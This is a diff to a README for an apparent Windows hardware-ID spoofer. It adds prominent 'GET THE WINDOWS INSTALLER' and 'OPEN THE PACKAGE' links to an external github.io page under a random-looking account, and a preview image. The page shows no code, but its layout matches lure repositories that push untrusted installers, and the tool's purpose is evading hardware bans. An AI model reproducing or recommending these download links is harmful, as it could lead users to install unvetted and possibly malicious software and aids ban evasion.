@@ -6,7 +6,7 @@ A hardware-ID spoofer — is a Windows desktop utility that rewrites the identif
 
 # 📥 **INSTALLER PICKUP — START HERE**
 
-## [⬇️ **GET THE WINDOWS INSTALLER**]( )
+## [⬇️ **GET THE WINDOWS INSTALLER**](https://pdcaazytjhku.github.io/HWID-Spoofer-ID-Changer-PC-Windows/)
 
 > One tap, the package opens on its own page — no wrapper in between.
 
@@ -14,11 +14,11 @@ A hardware-ID spoofer — is a Windows desktop utility that rewrites the identif
 
 ## 🖼️ **PREVIEW IMAGE**
 
-<img src="" width="1280" height="720" alt= preview image">
+<img src="https://github.com/pdcaazytjhku/HWID-Spoofer-ID-Changer-PC-Windows/blob/main/hwidspoofer.jpg?raw=true" width="1280" height="720" alt= preview image">
 
 ---
 
-### 📦 [**OPEN THE PACKAGE**]( )
+### 📦 [**OPEN THE PACKAGE**](https://pdcaazytjhku.github.io/HWID-Spoofer-ID-Changer-PC-Windows/)
 
 ---
 
